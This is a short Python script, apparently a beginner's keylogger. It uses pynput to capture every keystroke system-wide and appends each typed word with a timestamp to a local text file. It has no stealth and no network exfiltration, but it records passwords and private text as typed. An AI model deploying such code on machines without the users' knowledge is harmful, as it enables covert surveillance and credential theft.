import time
from pynput import keyboard


#The dictionary senteces is to save the text, and the time when is write
senteces = {}
text = ''

def on_press(key):
	"""This function the key who is press, when is press"""

	global text
	global senteces

	if key == keyboard.Key.space or key == keyboard.Key.enter:
		if len(text) != 0:
			senteces[time.asctime()] =  str(text)
			save_senteces(senteces)
			print(senteces)
			text = ''
			senteces = dict()
	else:
		if key == keyboard.Key.backspace:
			text = text[:-1]
		else:
			text += str(key).replace("'","")


def on_release(key):
	"""This funtion run when the key is release"""

	if key == keyboard.Key.esc:
		return False

def save_senteces(senteces):
	"""This function run when the key is release, if key press is [esc} finish"""

	with open('senteces.txt',  'a') as f:
		for time,text in senteces.items():
			f.write(text + ' - ' + str(time))
			f.write('\n')

if __name__ == '__main__':
	with keyboard.Listener(on_press= on_press, on_release=on_release) as listener:
		listener.join()
